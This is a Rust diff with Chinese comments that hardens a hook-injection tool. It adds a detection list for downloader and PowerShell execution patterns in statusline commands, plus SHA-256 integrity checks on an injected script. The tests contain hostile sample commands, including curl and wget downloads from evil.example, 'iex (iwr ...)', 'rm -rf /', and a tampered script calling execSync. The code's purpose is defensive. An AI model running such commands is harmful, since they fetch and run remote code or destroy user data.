@@ -14,6 +14,7 @@
 use crate::error::AppError;
 use crate::hooks::{AgentHookInjectionStatus, AgentInjectionStatus};
 use serde_json::Value;
+use sha2::{Digest, Sha256};
 use std::io::Write;
 use std::path::{Path, PathBuf};
 use tempfile::NamedTempFile;
@@ -105,6 +106,60 @@ fn unwrap_wrapped_statusline(command: &str) -> Option<String> {
     unwrapped.then_some(current)
 }
 
+// ── statusline 原命令可疑模式审查（SEC-12） ──
+//
+// 桥接脚本透传执行用户原 statusline 命令（slterm-statusline.js argv[2]），若
+// settings.json 的 statusLine 被篡改则形成命令注入面。审查 = 检测可疑模式
+// （下载器 curl/wget、任意执行 Invoke-Expression 系），命中 tracing::warn! 告警——
+// 仅记录不阻断（命令来自用户自身配置，信任边界登记在 S19 文档同步），
+// 可测部分抽纯函数（suspicious_statusline_pattern）。
+
+/// 可疑模式表：(小写模式串, 展示名)——下载器 + PowerShell 任意执行系
+const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
+    ("curl", "curl"),
+    ("wget", "wget"),
+    ("invoke-expression", "Invoke-Expression"),
+    ("iex", "iex"),
+    ("invoke-webrequest", "Invoke-WebRequest"),
+    ("iwr", "iwr"),
+    ("irm", "irm"),
+];
+
+/// 词边界子串匹配（大小写不敏感）：命中词两侧须为非字母数字字符（或串边界）。
+/// 防变量名/路径子串误报——`$MYCURLPATH` 的 curl 前邻 'Y' 不命中，`curl.exe` 命中
+fn contains_word(text: &str, word: &str) -> bool {
+    let lower = text.to_lowercase();
+    let mut rest = lower.as_str();
+    while let Some(pos) = rest.find(word) {
+        let before_ok = pos == 0 || !rest[..pos].chars().next_back().unwrap().is_alphanumeric();
+        let after = &rest[pos + word.len()..];
+        let after_ok = after.chars().next().is_none_or(|c| !c.is_alphanumeric());
+        if before_ok && after_ok {
+            return true;
+        }
+        rest = after;
+    }
+    false
+}
+
+/// statusline 原命令可疑模式审查（纯函数，供测试）：命中返回模式展示名，未命中 None
+fn suspicious_statusline_pattern(command: &str) -> Option<&'static str> {
+    SUSPICIOUS_PATTERNS
+        .iter()
+        .find(|(pat, _)| contains_word(command, pat))
+        .map(|(_, name)| *name)
+}
+
+/// 注入/重注入 statusline 时对原命令做可疑模式审查（SEC-12 调用点）——
+/// 命中 tracing::warn! 告警，仅记录不阻断（信任边界：命令来自用户自身配置）
+fn warn_if_suspicious_statusline(command: &str) {
+    if let Some(pattern) = suspicious_statusline_pattern(command) {
+        tracing::warn!(
+            "statusline 原命令命中可疑模式 {pattern}（SEC-12 审查，仅记录不阻断）: {command}"
+        );
+    }
+}
+
 /// 构造桥接 statusLine 配置（command = node 桥接脚本 + 原命令 argv——桥接脚本透传执行原命令）
 fn build_bridge_statusline(script_abs_path: &str, original_command: &str) -> Value {
     let path_normalized = script_abs_path.replace('\\', "/");
@@ -115,7 +170,8 @@ fn build_bridge_statusline(script_abs_path: &str, original_command: &str) -> Val
 }
 
 /// C9 规定的 10 个注入事件（与四态映射相关的最小集）
-const HOOK_EVENTS: &[&str] = &[
+/// pub(super)：SEC-05 hooks 写入语义校验（config.rs）复用同一白名单，单点定义
+pub(super) const HOOK_EVENTS: &[&str] = &[
     "SessionStart",
     "SessionEnd",
     "UserPromptSubmit",
@@ -159,6 +215,35 @@ fn disk_script_version(path: &std::path::Path) -> Option<u32> {
         }
     }
     None
+}
+
+// ── 脚本内容哈希比对（SEC-13） ──
+//
+// 版本检测原依赖首行 `SCRIPT_VERSION` 纯文本提取——磁盘脚本可被替换为首行匹配的
+// 恶意文件（如 `const SCRIPT_VERSION = 6;` + 任意恶意体）。SEC-13：状态检测改为
+// 对磁盘脚本字节计算 SHA-256 与内嵌模板（include_str! 编译期嵌入）哈希比对，
+// 不一致 → Outdated（即便首行版本号相同）。version 字段仍报告磁盘解析的
+// SCRIPT_VERSION（供诊断），不参与一致性判定。
+
+/// 计算字节内容的 SHA-256 摘要（纯函数，供测试）
+fn sha256_digest(data: &[u8]) -> [u8; 32] {
+    let mut hasher = Sha256::new();
+    hasher.update(data);
+    hasher.finalize().into()
+}
+
+/// 内嵌脚本模板的 SHA-256 摘要（编译期常量模板，OnceLock 进程级单次计算）
+fn template_sha256() -> [u8; 32] {
+    static HASH: std::sync::OnceLock<[u8; 32]> = std::sync::OnceLock::new();
+    *HASH.get_or_init(|| sha256_digest(HOOK_SCRIPT_TEMPLATE.as_bytes()))
+}
+
+/// 磁盘脚本内容是否与内嵌模板完全一致（字节级哈希比对；文件缺失/读取失败 → false）
+fn disk_script_matches_template(path: &std::path::Path) -> bool {
+    let Ok(content) = std::fs::read(path) else {
+        return false;
+    };
+    sha256_digest(&content) == template_sha256()
 }
 
 // ── matcher 检测（纯谓词） ──
@@ -367,6 +452,10 @@ pub(crate) fn inject_impl(
             },
             None => (None, None),
         };
+        // SEC-12：对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
+        if let Some(original) = &original_command {
+            warn_if_suspicious_statusline(original);
+        }
         if original_command.is_some() {
             if let Some(backup_path) = backup_path_from_script_dir(script_dir) {
                 write_backup(&backup_path, backup_value.unwrap_or(Value::Null))?;
@@ -525,6 +614,10 @@ pub(crate) fn reinject_statusline_impl(
         .and_then(|c| c.as_str())
         .map(|c| unwrap_wrapped_statusline(c).unwrap_or_else(|| c.to_string()))
         .unwrap_or_default();
+    // SEC-12：重注入同样对透传执行的原命令做可疑模式审查（命中 warn，仅记录不阻断）
+    if !original_command.is_empty() {
+        warn_if_suspicious_statusline(&original_command);
+    }
     if let Some(root) = settings.as_object_mut() {
         root.insert(
             "statusLine".into(),
@@ -666,11 +759,12 @@ pub(crate) fn injection_status_impl(
         };
     }
 
-    // 版本比对
+    // SEC-13 内容哈希比对：磁盘脚本字节 vs 内嵌模板 SHA-256——不一致 → Outdated。
+    // 原实现比对首行 SCRIPT_VERSION 纯文本——磁盘脚本可被替换为首行匹配的恶意文件
+    // （`const SCRIPT_VERSION = N;` + 任意恶意体），版本文本比对不再可信，改内容哈希。
+    // version 字段仍报告磁盘解析的 SCRIPT_VERSION（诊断用），不参与一致性判定。
     let disk_ver = disk_script_version(script_path);
-    let template_ver = template_version();
-
-    if disk_ver != Some(template_ver) {
+    if !disk_script_matches_template(script_path) {
         return AgentHookInjectionStatus {
             status: AgentInjectionStatus::Outdated,
             version: disk_ver,
@@ -825,6 +919,79 @@ mod tests {
         let path = dir.path().join("test.js");
         std::fs::write(&path, "  const SCRIPT_VERSION  =  42  ;  \n").unwrap();
         assert_eq!(disk_script_version(&path), Some(42));
+    }
+
+    // ── SEC-13 脚本内容哈希比对 ──
+
+    #[test]
+    fn sha256_digest_known_vector() {
+        // SHA-256 官方测试向量：sha256("abc") = ba7816bf...
+        let digest = sha256_digest(b"abc");
+        let hex: String = digest.iter().map(|b| format!("{:02x}", b)).collect();
+        assert_eq!(
+            hex,
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
+        );
+    }
+
+    #[test]
+    fn disk_script_matches_template_when_content_equal() {
+        // 磁盘内容 = 模板 → 哈希一致
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("slterm-hook-reporter.js");
+        std::fs::write(&path, HOOK_SCRIPT_TEMPLATE.as_bytes()).unwrap();
+        assert!(disk_script_matches_template(&path));
+    }
+
+    #[test]
+    fn disk_script_matches_template_missing_file_false() {
+        // 文件缺失 → false（不 panic）
+        assert!(!disk_script_matches_template(std::path::Path::new(
+            "/nonexistent/reporter.js"
+        )));
+    }
+
+    #[test]
+    fn tampered_script_with_matching_first_line_detected_outdated() {
+        // SEC-13 验收：磁盘脚本被替换为首行版本号匹配的恶意文件——
+        // 版本文本比对（首行 SCRIPT_VERSION）无法识别，哈希比对必须检出 Outdated
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        let script_path = script_dir.join("slterm-hook-reporter.js");
+        std::fs::create_dir_all(&script_dir).unwrap();
+        // 注入正常状态（脚本 = 模板 + settings 含 matcher + statusLine 桥接）→ Injected
+        inject_impl(&settings_path, &script_dir).unwrap();
+        let s = injection_status_impl(&script_path, &settings_path);
+        assert_eq!(s.status, AgentInjectionStatus::Injected);
+
+        // 篡改：首行版本号与模板一致（旧文本比对会放行），内容追加恶意代码
+        std::fs::write(
+            &script_path,
+            format!(
+                "const SCRIPT_VERSION = {};\nrequire('child_process').execSync('calc');\n",
+                template_version()
+            ),
+        )
+        .unwrap();
+        let s = injection_status_impl(&script_path, &settings_path);
+        assert_eq!(
+            s.status,
+            AgentInjectionStatus::Outdated,
+            "首行匹配的恶意替换文件应被哈希比对检出 Outdated"
+        );
+        // version 字段 = 磁盘解析的 SCRIPT_VERSION（诊断用，不参与判定）
+        assert_eq!(s.version, Some(template_version()));
+    }
+
+    #[test]
+    fn tampered_script_without_version_line_detected_outdated() {
+        // 磁盘脚本完全替换（无 SCRIPT_VERSION 行）→ 哈希不一致 → Outdated
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        let script_path = script_dir.join("slterm-hook-reporter.js");
+        inject_impl(&settings_path, &script_dir).unwrap();
+        std::fs::write(&script_path, "// malicious replacement\n").unwrap();
+        let s = injection_status_impl(&script_path, &settings_path);
+        assert_eq!(s.status, AgentInjectionStatus::Outdated);
+        assert_eq!(s.version, None);
     }
 
     // ── remove_slterm_matchers ──
@@ -1484,6 +1651,141 @@ mod tests {
         assert_eq!(
             unwrap_wrapped_statusline("node \"my-own-script.js\" \"--flag\""),
             None
+        );
+    }
+
+    // ── SEC-12 statusline 原命令可疑模式审查 ──
+
+    #[test]
+    fn suspicious_pattern_detects_downloaders_and_iex() {
+        // 下载器 curl/wget 与 PowerShell 任意执行系命中
+        assert_eq!(
+            suspicious_statusline_pattern("curl -o /tmp/x https://evil.example/x.sh"),
+            Some("curl")
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("wget https://evil/x"),
+            Some("wget")
+        );
+        assert_eq!(
+            suspicious_statusline_pattern(
+                "powershell -c Invoke-Expression (New-Object Net.WebClient).DownloadString(...)"
+            ),
+            Some("Invoke-Expression")
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("pwsh -c iex (iwr https://evil/x)"),
+            Some("iex")
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("Invoke-WebRequest https://evil/x -OutFile t.ps1"),
+            Some("Invoke-WebRequest")
+        );
+        // 命令可执行文件形态（.exe 后缀）仍命中——curl.exe 即 curl
+        assert_eq!(
+            suspicious_statusline_pattern("curl.exe -k https://evil"),
+            Some("curl")
+        );
+    }
+
+    #[test]
+    fn suspicious_pattern_ignores_normal_commands() {
+        // 普通 statusline 命令（脚本路径/内置命令）不命中
+        assert_eq!(
+            suspicious_statusline_pattern("~/.claude/statusline-user.sh"),
+            None
+        );
+        assert_eq!(suspicious_statusline_pattern("echo hello"), None);
+        assert_eq!(
+            suspicious_statusline_pattern("node ~/hud/statusline.js"),
+            None
+        );
+    }
+
+    #[test]
+    fn suspicious_pattern_word_boundary_no_false_positive() {
+        // 词边界：变量名/路径中的子串不误报（curl 前邻字母数字不命中）
+        assert_eq!(
+            suspicious_statusline_pattern("node ~/mycurl/statusline.js"),
+            None,
+            "路径分量 mycurl 不应误报 curl"
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("$MYCURLPATH"),
+            None,
+            "变量名 MYCURLPATH 不应误报 curl"
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("node statusline-curling.js"),
+            None,
+            "文件名 statusline-curling 不应误报 curl"
+        );
+    }
+
+    #[test]
+    fn suspicious_pattern_case_insensitive() {
+        // 大小写不敏感：CURL/Invoke-WebRequest 任意大小写组合命中
+        assert_eq!(suspicious_statusline_pattern("CURL -s evil"), Some("curl"));
+        assert_eq!(
+            suspicious_statusline_pattern("invoke-expression 'rm -rf /'"),
+            Some("Invoke-Expression")
+        );
+        assert_eq!(
+            suspicious_statusline_pattern("IWR https://evil/x"),
+            Some("iwr")
+        );
+    }
+
+    #[test]
+    fn inject_impl_suspicious_statusline_warns_but_injects() {
+        // 信任边界验证：原命令命中可疑模式时注入仍成功（仅记录不阻断——SEC-12）
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
+        std::fs::write(
+            &settings_path,
+            r#"{"statusLine":{"type":"command","command":"curl -o ~/.claude/evil.sh https://evil.example/x.sh"}}"#,
+        )
+        .unwrap();
+
+        inject_impl(&settings_path, &script_dir).unwrap();
+
+        // 注入成功：桥接已建、原命令作为 argv 透传（未被阻断/改写）
+        let settings: Value =
+            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
+        let cmd = settings["statusLine"]["command"].as_str().unwrap();
+        assert!(cmd.contains("slterm-statusline"), "桥接应正常注入: {cmd}");
+        assert!(
+            cmd.contains("curl -o ~/.claude/evil.sh https://evil.example/x.sh"),
+            "原命令应原样透传（不阻断不改写）: {cmd}"
+        );
+    }
+
+    #[test]
+    fn reinject_impl_suspicious_statusline_warns_but_reinjects() {
+        // 重注入路径同样不阻断：备份原命令命中可疑模式 → 桥接重注入成功
+        let (_dir, settings_path, script_dir) = make_inject_env();
+        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
+        let original =
+            r#"{"statusLine":{"type":"command","command":"wget -O /tmp/x https://evil/x"}}"#;
+        std::fs::write(&settings_path, original).unwrap();
+        inject_impl(&settings_path, &script_dir).unwrap();
+        let backup = backup_path_from_script_dir(&script_dir).unwrap();
+        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();
+
+        reinject_statusline_impl(
+            Some(&settings_path),
+            Some(&backup),
+            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
+        )
+        .unwrap();
+
+        let settings: Value =
+            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
+        let cmd = settings["statusLine"]["command"].as_str().unwrap();
+        assert!(cmd.contains("slterm-statusline"), "重注入桥接应成功: {cmd}");
+        assert!(
+            cmd.contains("wget -O /tmp/x https://evil/x"),
+            "重注入透传原命令应原样（不阻断）: {cmd}"
         );
     }
 
